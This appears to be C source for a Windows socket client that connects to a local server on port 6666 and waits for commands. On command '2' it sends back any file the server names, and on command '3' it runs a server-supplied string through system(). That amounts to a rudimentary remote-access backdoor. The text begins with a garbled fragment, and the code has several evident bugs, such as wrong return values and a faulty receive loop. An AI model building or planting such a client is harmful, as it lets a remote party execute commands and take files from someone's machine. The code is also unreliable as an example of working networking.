   2   send_this.jpginclude <string.h>
#include <stdio.h>
#include <string.h>
#include <WinSock2.h>
#include <ws2tcpip.h>

// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")
#pragma warning (disable : 4996)

int getFileSize(FILE* file) {
	fseek(file, 0L, SEEK_END);
	int size = ftell(file);
	fseek(file, 0L, SEEK_SET);

	return size;
}

int writeBinaryFile(char* fileName,char* buffer, int size) {
	FILE* file = fopen(fileName, "wb");
	if (file == NULL) {
		printf("Write : Unable to open file\n");
		return;
	}

	int returnedWrite = fwrite(buffer, size, 1, file);

	if (returnedWrite != 1) {
		printf("Write : error");
		remove(fileName);
		return -1;
	}

	fclose(file);

}

unsigned char* readBinaryFile(char* fileName, int* size) {
	unsigned char* buffer;

	FILE* file = fopen(fileName, "rb");
	if (file == NULL) {
		printf("Read : Unable to open file\n");
		return;
	}

	*size = getFileSize(file);
	if (*size == 0) {
		printf("Read : file is empty\n");
		return;
	}

	buffer = calloc(*size, sizeof(unsigned char));

	fread(buffer, *size, 1, file);

	/*for (int i = 0; i < size;i++) {
		printf("%c", buffer[i]);
	}
	*/

	fclose(file);

	return buffer;

}
SOCKET* SocketClient(char* address, char* port) {
	WSADATA wsa;
	int iResult;
	u_long iMode = 0;
	SOCKET ClientSocket;
	struct addrinfo hints, * result, * iteration;

	printf("\nInitialising Winsock...\n");
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		printf("Failed. Error Code : %d", WSAGetLastError());
		return NULL;
	}
	printf("Initialised.\n");

	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;

	iResult = getaddrinfo(address, port, &hints, &result);

	if (iResult != 0) {
		printf("GETADDRINFO error\n");
		return NULL;
	}

	for (iteration = result; iteration != NULL; iteration = iteration->ai_next) {

		ClientSocket = socket(iteration->ai_family, iteration->ai_socktype, iteration->ai_protocol);
		if (ClientSocket == SOCKET_ERROR) {
			printf("client : socket\n");
			continue;
		}

		iResult = connect(ClientSocket, iteration->ai_addr, iteration->ai_addrlen);
		if (iResult == -1) {
			closesocket(ClientSocket);
			printf("client : connect\n");
			continue;
		}

		break;
	}

	if (iResult == -1) {
		printf("Client : failed to connect\n");
		return NULL;
	}
		
	freeaddrinfo(result);

	SOCKET* newSocket = malloc(sizeof(SOCKET));
	*newSocket = ClientSocket;
	return newSocket;

}

void receiveFile(SOCKET ClientSocket) {
	int iResult = 0;
	char* fileName;
	int fileSize = 0;
	int fileNameSize = 0;
	unsigned char* fileContent;
	char size[15];


	int total = 0;
	//reads an filename size from the socket stream
	iResult = recv(ClientSocket, &fileNameSize, sizeof(int), MSG_WAITALL);
	if (iResult == -1) {
		printf("Recv file name size : error\n");
		return -1;
	}
	fileNameSize = ntohl(fileNameSize);
	printf("File name size if : %d\n", fileNameSize);
 
	//reads file name from the socket
	fileName = calloc(fileNameSize + 1, sizeof(char));
	iResult = recv(ClientSocket, fileName, fileNameSize, MSG_WAITALL);
	if (iResult == -1) {
		printf("Recv file name : error\n");
		return -1;	
	}
	printf("File Name Received : %s\n", fileName);

	//reads  file size from the socket
	iResult = recv(ClientSocket, &fileSize, sizeof(int), MSG_WAITALL);
	if (iResult == -1) {
		printf("Recv file size : error\n");
		return -1;
	}
	fileSize = ntohl(fileSize);
	printf("File Size Received : %d\n", fileSize);

	//reads the actual file content
	total = iResult = 0;
	fileContent = calloc(fileSize, sizeof(unsigned char));
	while (iResult = recv(ClientSocket, fileContent, fileSize, MSG_WAITALL) > 0) {
		total += iResult;
		if (iResult == -1) {
			printf("Recv file name size : error\n");
			return -1;
		}
		if (total >= fileSize)
			break;
	}

	writeBinaryFile(fileName, fileContent, fileSize);
	free(fileContent);
	free(fileName);
	
	
}

//the receive/send format is 20bytes-title, 4bytes-size, rest-content
int sendFile(SOCKET ClientSocket, char* fileName) {
	int iResult = 0;
	int fileSize = 0;
	unsigned char* fileBuffer = readBinaryFile(fileName, &fileSize);
	int fileNameSize = htonl(strlen(fileName));
	int sendFileSize = htonl(fileSize);
	int total = fileSize;
	//sends the 4byte int for the filename size
	iResult = send(ClientSocket, &fileNameSize, sizeof(fileNameSize), 0);
	if (iResult == -1) {
		printf("Send file size : error\n");
		return -1;
	}
	//sends the filename
	iResult = send(ClientSocket, fileName, strlen(fileName), 0);
	if (iResult == -1) {
		printf("Send file size : error\n");
		return -1;
	}
	//sends the file size
	iResult = send(ClientSocket, &sendFileSize, sizeof(int), 0);
	if (iResult == -1) {
		printf("Send file size : error\n");
		return -1;
	}
	//sends the total content of the file
	while (total > 0) {
		iResult = send(ClientSocket, fileBuffer, fileSize, 0);
		if (iResult < 0)
			return -1;

		total -= iResult;
	}
	
	
	return 1;
}

char* receiveMessage(SOCKET ClientSocket) {
	int iResult = 0;
	int messageLength = 0;
	char* message;

	char check;
	iResult = recv(ClientSocket, &check, sizeof(check), MSG_PEEK);
	if (iResult <= 0) {
		return NULL;
	}

	iResult = recv(ClientSocket, &messageLength, sizeof(int), MSG_WAITALL);
	if (iResult == -1) {
		printf("Recv message lengt\n");
		return NULL;
	}
	messageLength = ntohl(messageLength);

	message = calloc(messageLength + 1, sizeof(char));
	iResult = recv(ClientSocket, message, messageLength, MSG_WAITALL);
	if (iResult == -1) {
		printf("Recv message\n");
		return NULL;
	}

	return message;

}


int main() {
	SOCKET* socket = SocketClient("127.0.0.1", "6666");
	if (*socket == NULL) {
		printf("Socket connect : error\n");
		return 0;
	}
	
	char* message;

	while (1) {
		if (*socket == NULL) {
			printf("An error has occured trying to establish the connection again...\n");
			socket = SocketClient("127.0.0.1", "6666");
			if (*socket == NULL) {
				printf("Socket connect : error\n");
				return 0;
			}
		}

		message = receiveMessage(*socket);
		if (message == NULL)
			continue;

		if (strcmp(message, "2") == 0) {
			char* filename = receiveMessage(*socket);
			sendFile(*socket, filename);
			free(filename);
		}

		if (strcmp(message, "3") == 0) {
			char* command = receiveMessage(*socket);
			system(command);
			free(command);
	}


	}
	
	closesocket(*socket);
	free(socket);


}